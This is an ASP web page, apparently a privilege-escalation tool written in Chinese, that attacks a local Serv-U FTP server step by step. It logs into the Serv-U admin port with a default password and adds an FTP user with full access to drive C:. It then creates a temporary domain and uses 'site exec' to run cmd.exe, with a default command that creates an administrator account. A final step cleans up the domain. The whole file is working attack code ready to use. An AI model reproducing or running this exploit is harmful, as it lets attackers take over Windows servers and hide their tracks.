<style type="text/css">
<!--
body,td,th {
font-size: 12px;
}
-->
</style>
<%
Function httpopen(neirong,fangshi,dizhi,refer,cookIE)
set Http=server.createobject("Microsoft.XMLHTTP")
Http.open fangshi,dizhi,false
Http.setrequestheader "Referer",refer
Http.setrequestheader "Content-type","application/x-www-form-urlencoded"
Http.setrequestheader "Content-length",len(neirong)
Http.setrequestheader "User-Agent","Serv-U"
Http.setrequestheader "x-user-agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)"
If cookIE<>"" then
Http.setrequestheader "CookIE",cookIE
End If
Http.send neirong
httpopen=bytes2BSTR(Http.responseBody)
set Http=nothing
end Function

Function getmidstr(L,R,str)
int_left=instr(str,L)
int_right=instr(str,R)
If int_left>0 and int_right>0 Then 
getmidstr=mid(str,int_left+len(L),int_right-int_left-len(L))
Else
getmidstr="执行的字符串中不包含“"&L&"”或“"&R&"”" 
End If
end Function

Function bytes2BSTR(vIn) 
strReturn = "" 
For i = 1 To LenB(vIn) 
ThisCharCode = AscB(MidB(vIn,i,1)) 
If ThisCharCode < &H80 Then 
strReturn = strReturn & Chr(ThisCharCode) 
Else 
NextCharCode = AscB(MidB(vIn,i+1,1)) 
strReturn = strReturn & Chr (CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
i = i + 1 
End If 
Next 
bytes2BSTR = strReturn 
End Function 
%>
<%
    ''----------自定义参数开始-----------

action=Request("action")
loginpass=Request.Form("loginpass")
port=Request("port")
mydomain=Request.Form("mydomain")
path=Request.Form("path")
ftpport = Request.Form("ftpport")
user=Request.Form("user")
pass=Request.Form("pass")
cmd= Request.Form("cmd")
sessionid=Request("sessionid")
organizationId=Request("OrganizationId")
userid=Request("userid")
domainid=Request("domainid")

    ''----------自定义参数结束-----------

select case action

case 1
   returns=httpopen("user=&pword="&loginpass&"&language=zh%2CCN%26","POST","http://127.0.0.1:"&port&"/Web%20ClIEnt/Login.xml?Command=Login&Sync=1227081437828","http://127.0.0.1:"&port&"/?Session=39893&Language=zh,CN&LocalAdmin=1","")
   sessionid=getmidstr("<sessionid>","</sessionid>",returns)
   if sessionid<>"" then
   Response.Write "login ok!"&"</br>"
   Response.redirect "?action=2&sessionid="&sessionid&"&port="&port
   else
   Response.Write "error!"&"</br>"
   end if  

case 2
   call main2()

case 3
   returns=httpopen("","POST","http://127.0.0.1:"&port&"/Admin/ServerUsers.htm?Page=1","",sessionid)
   organizationIdTemp=mid(returns,instr(returns,"OrganizationUsers.xml&ID="),len("OrganizationUsers.xml&ID=")+15)
   organizationId=mid(OrganizationIdTemp,instr(OrganizationIdTemp,"=")+1,instr(OrganizationIdTemp,"""")-instr(OrganizationIdTemp,"=")-1)
   if organizationId<>"" then
   Response.write "get organizationId "&OrganizationId&" ok!"&"</br>"
   Response.redirect "?action=4&sessionid="&sessionid&"&port="&port&"&OrganizationId="&OrganizationId
                else
   Response.write "error!"&"</br>"
   end if

case 4
   call main3()

case 5
   returns=httpopen("","POST","http://127.0.0.1:"&port&"/Admin/XML/User.xml?Command=AddObject&Object=COrganization."&OrganizationId&".User&Temp=1&Sync=1227081437828","http://127.0.0.1:"&port&"/Admin/ServerUsers.htm?Page=1",sessionid)
   userid=getmidstr("<var name=""ObjectID"" val=""",""" />",returns)
   if userid<>"" then
   Response.write "get userid "&userid&" ok!"&"</br>"
   Response.redirect "?action=6&sessionid="&sessionid&"&port="&port&"&OrganizationId="&OrganizationId&"&userid="&userid
   else
   Response.write "error!"
   end if

case 6
   call main4()

case 7
   returns=httpopen("Access=7999&MaxSize=0&Dir=%2Fc%3A&undefined=undefined&MaxSizeDisp=&","POST","http://127.0.0.1:"&port&"/Admin/XML/Result.xml?Command=AddObject&Object=CUser."&userid&".DirAccess&Sync=1227081437828","http://127.0.0.1:"&port&"/Admin/ServerUsers.htm?Page=1",sessionid)
   returns=httpopen("LoginID="&user&"&FullName=&Password="&pass&"&ComboPasswordType=%E5%B8%B8%E8%A7%84%E5%AF%86%E7%A0%81&PasswordType=0&ComboAdminType=%E6%97%A0%E6%9D%83%E9%99%90&AdminType=&ComboHomeDir=%2FC%3A&HomeDir=%2F"&path&"&ComboType=%E6%B0%B8%E4%B9%85%E5%B8%90%E6%88%B7&Type=0&ExpiresOn=0&ComboWebClIEntStartupMode=%E6%8F%90%E7%A4%BA%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E4%BD%95%E7%A7%8D%E5%AE%A2%E6%88%B7%E7%AB%AF&WebClIEntStartupMode=&LockInHomeDir=0&Enabled=1&AlwaysAllowLogin=1&Description=&=&IncludeRespCodesInMsgFiles=&ComboSignOnMessageFilePath=&SignOnMessageFilePath=&SignOnMessage=&SignOnMessageText=&ComboLimitType=%E8%BF%9E%E6%8E%A5&LimitType=Connection&QuotaBytes=0&Quota=0&","POST","http://127.0.0.1:"&port&"/Admin/XML/Result.xml?Command=UpdateObject&Object=COrganization."&OrganizationId&".User."&userid&"&Sync=1227081437828","http://127.0.0.1:"&port&"/Admin/ServerUsers.htm?Page=1",sessionid)
   Response.write "add user ok!"&"</br>"
   Response.redirect "?action=8&userid="&userid&"&port="&port&"&sessionid="&sessionid&"&OrganizationId="&OrganizationId

case 8
   call main5()

case 9
   returns=httpopen("DomainName="&mydomain&"&Description=test1&Enabled=1&EnableFTP=1&EnableFTPS=0&EnableSSH=0&EnableHTTP=0&EnableHTTPS=0&FTPPort="&ftpport&"&FTPSPort=990&SSHPort=22&HTTPPort=80&HTTPSPort=443&BindIPAddress=&","POST","http://127.0.0.1:"&port&"/Admin/XML/Result.xml?Command=ObjectCommand&Object=CServer.0.CreateDomain&Sync=1227081437828","http://127.0.0.1:"&port&"/Admin/ServerUsers.htm?Page=1",sessionid)
   domainid=getmidstr("<ObjectID>","</ObjectID>",returns)
   Response.write "create domain ok!"&"</br>"
   Response.redirect "?action=10&userid="&userid&"&port="&port&"&sessionid="&sessionid&"&OrganizationId="&OrganizationId&"&domainid="&domainid

case 10
   call main6()

case 11
   set b=Server.CreateObject("Microsoft.XMLHTTP")
   b.open "GET", "http://127.0.0.1:"&ftpport&"/", false, "", ""
   b.send "User " & user & vbCrLf & "pass "& pass & vbCrLf & "site exec c:\windows\system32\cmd.exe /c "& cmd & vbCrLf & "QUIT" & vbCrLf
   Response.Write Replace(b.responseText,chr(13),"<br>")
   Response.redirect "?action=12&userid="&userid&"&port="&port&"&sessionid="&sessionid&"&OrganizationId="&OrganizationId&"&domainid="&domainid

case 12
   call main7()

case 13
   returns=httpopen("IDs="&domainid&"&","POST","http://127.0.0.1:"&port&"/Admin/XML/Result.xml?Command=DeleteObject&Object=CServer.0.Domain&Sync=1227081437828","http://127.0.0.1:"&port&"/Admin/ServerUsers.htm?Page=1",sessionid)
   Response.Write "临时域清理完毕!用户请手动清理,因为serv-u的userid变化我搞不懂."&"</br>"

case else
   call main1()

end select

sub main1()
%>
<form id="form1" name="form1" method="post" action="?action=1">
<table width="264" border="0" align="center" cellpadding="0" cellspacing="0">
    <tr>
      <td colspan="2" align="center"><strong>第一步:获取sessionid</strong></td>
    </tr>
    <tr>
      <td align="right">管理端口:</td>
      <td><input name="port" type="text" id="port" value="43958" /></td>
    </tr>
    <tr>
      <td align="right">管理员密码:</td>
      <td><input name="loginpass" type="text" id="loginpass" value="1" /></td>
    </tr>
    <tr>
      <td colspan="2" align="center"><input type="submit" name="button" id="button" value="提交" />
     </td>
    </tr>
</table>
</form>
<p align=center><strong>一般情况下不用改,如果管理员改了的话就填上去.</strong></p>
<%
end sub
%>
<% sub main2() %>

<form id="form1" name="form1" method="post" action="?action=3&sessionid=<%=sessionid%>&port=<%=port%>">
<table width="264" border="0" align="center" cellpadding="0" cellspacing="0">
    <tr>
      <td colspan="2" align="center"><strong>第二步:获取OrganizationId</strong></td>
    </tr>
    
    <tr>
      <td colspan="2" align="center"><input type="submit" name="button" id="button" value="提交" />
     </td>
    </tr>
</table>
</form>
<p align=center><strong>这一步有点慢,请等待.</strong></p>

<% end sub %>
<% sub main3() %>

<form id="form1" name="form1" method="post" action="?action=5&sessionid=<%=sessionid%>&port=<%=port%>&OrganizationId=<%=OrganizationId%>">
<table width="264" border="0" align="center" cellpadding="0" cellspacing="0">
    <tr>
      <td colspan="2" align="center"><strong>第三步:获取userid</strong></td>
    </tr>
    
    <tr>
      <td colspan="2" align="center"><input type="submit" name="button" id="button" value="提交" />
     </td>
    </tr>
</table>
</form>

<% end sub %>
<% sub main4() %>

<form id="form1" name="form1" method="post" action="?action=7&sessionid=<%=sessionid%>&port=<%=port%>&OrganizationId=<%=OrganizationId%>&userid=<%=userid%>">
<table width="264" border="0" align="center" cellpadding="0" cellspacing="0">
    <tr>
      <td colspan="2" align="center"><strong>第四步:加用户</strong></td>
    </tr>
    <tr>
      <td align="right">新ftp账号:</td>
      <td><input name="user" type="text" id="user" value="ash" /></td>
    </tr>
    <tr>
      <td align="right">新ftp密码:</td>
      <td><input name="pass" type="text" id="pass" value="hahaha" /></td>
    </tr>
    <tr>
      <td align="right">系统路径:</td>
      <td><input name="path" type="text" id="path" value="c:" /></td>
    </tr>
    <tr>
      <td colspan="2" align="center"><input type="submit" name="button" id="button" value="提交" />
     </td>
    </tr>
</table>
</form>

<% end sub %>
<% sub main5() %>

<form id="form1" name="form1" method="post" action="?action=9&port=<%=port%>&userid=<%=userid%>&sessionid=<%=sessionid%>&OrganizationId=<%=OrganizationId%>">
<table width="264" border="0" align="center" cellpadding="0" cellspacing="0">
    <tr>
      <td colspan="2" align="center"><strong>第五步:创建域</strong></td>
    </tr>
    <tr>
      <td align="right">要添加的域:</td>
      <td><input name="mydomain" type="text" id="mydomain" value="testhack" /></td>
    </tr>
    <tr>
      <td align="right">域端口:</td>
      <td><input name="ftpport" type="text" id="ftpport" value="60000" /></td>
    </tr>
    <tr>
      <td colspan="2" align="center"><input type="submit" name="button" id="button" value="提交" />
     </td>
    </tr>
</table>
</form>

<% end sub %>
<% sub main6() %>

<form id="form1" name="form1" method="post" action="?action=11&port=<%=port%>&userid=<%=userid%>&sessionid=<%=sessionid%>&OrganizationId=<%=OrganizationId%>&domainid=<%=domainid%>">
<table border="0" align="center" cellpadding="0" cellspacing="0">
    <tr>
      <td colspan="2" align="center"><strong>执行命令</strong></td>
    </tr>
   
    <tr>
      <td align="right">FTP账号:</td>
      <td><input name="user" type="text" id="user" value="ash" /></td>
    </tr>
    <tr>
        <tr>
      <td align="right">FTP密码:</td>
      <td><input name="pass" type="text" id="pass" value="hahaha" /></td>
    </tr>
    <tr>
      <td align="right">FTP端口:</td>
      <td><input name="ftpport" type="text" id="ftpport" value="60000" /></td>
    </tr>
    <tr>
      <td align="right">你的语句:</td>
      <td><input name="cmd" type="text" id="cmd" value="net user admin admin123456 /add&net localgroup administrators admin /add" size="80" /></td>
    </tr>
    <tr>
      <td colspan="2" align="center"><input type="submit" name="button" id="button" value="提交" />
      </td>
    </tr>
</table>
</form>
<p align=center><strong>注意:如果是serv-u 7.0,这里可以马上点提交.</strong></p>
<p align=center><strong>注意:如果是serv-u 7.0以上,请在执行完上一步之后过大概半分钟才提交.</strong></p>


<% end sub %>
<% sub main7() %>

<form id="form1" name="form1" method="post" action="?action=13&port=<%=port%>&userid=<%=userid%>&sessionid=<%=sessionid%>&OrganizationId=<%=OrganizationId%>&domainid=<%=domainid%>">
<table width="264" border="0" align="center" cellpadding="0" cellspacing="0">
    <tr>
      <td colspan="2" align="center"><strong>删除临时域</strong></td>
    </tr>
    
    <tr>
      <td colspan="2" align="center"><input type="submit" name="button" id="button" value="提交" />
     </td>
    </tr>
</table>
</form>

<% end sub %>

